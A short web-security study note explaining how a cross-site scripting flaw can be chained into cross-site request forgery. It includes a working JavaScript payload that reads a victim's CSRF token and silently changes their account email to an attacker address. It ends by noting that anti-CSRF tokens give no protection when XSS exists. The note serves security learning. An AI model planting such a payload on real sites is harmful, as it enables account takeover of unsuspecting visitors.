In worst cases, a XSS vulnerability can be used to perform [Cross-site Request Forgery](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FClient-side%20Vulnerabilities%2FCross-site%20Request%20Forgery%20(CSRF)%2FIntroduction) attacks, depending on the target website, an attacker might be able to make the victim send a message, accept a friend request, transfer some Bitcoin, or change their email address.

For example, a website allows logged-in users to change their email address without entering their password, and a XSS vulnerability is found on their blog post comments. An attacker can use the following XSS payload to force anyone who visits the page to change their email address to an attacker-controlled email:
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@attacker.com')
};
</script>
```
## Note
When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.